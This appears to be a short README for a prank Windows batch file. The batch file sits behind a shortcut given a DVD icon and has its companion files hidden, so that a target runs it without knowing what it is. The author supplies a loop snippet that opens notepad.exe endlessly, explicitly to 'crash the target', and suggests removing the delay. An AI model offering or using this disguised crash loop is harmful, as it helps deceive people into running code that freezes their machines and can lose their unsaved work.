Simple .bat file that runs several pictures and opens cmd prompts. I have it set up so all files are hidden, and the .bat shortcut shows a DVD icon. The shortcut is set for D drive, so you may need to delete it and re-create a shortcut to the main season 1 .bat to match your directory.
This can be made more 'malicious' by opening notepads or terminals on a never ending loop to crash the machine. This is not set up this way currently. 
Just download the whole folder, and make everything besides the batch file's shortcut hidden, the only reason I use the shortcut is to edit the icon to a DVD. 
If you want to crash the target, add 
:loop
start notepad.exe
timeout /t 2 >nul
goto loop

to the end of the .bat, you can remove the timeout line, or set it to keep opening every 2 seconds. 
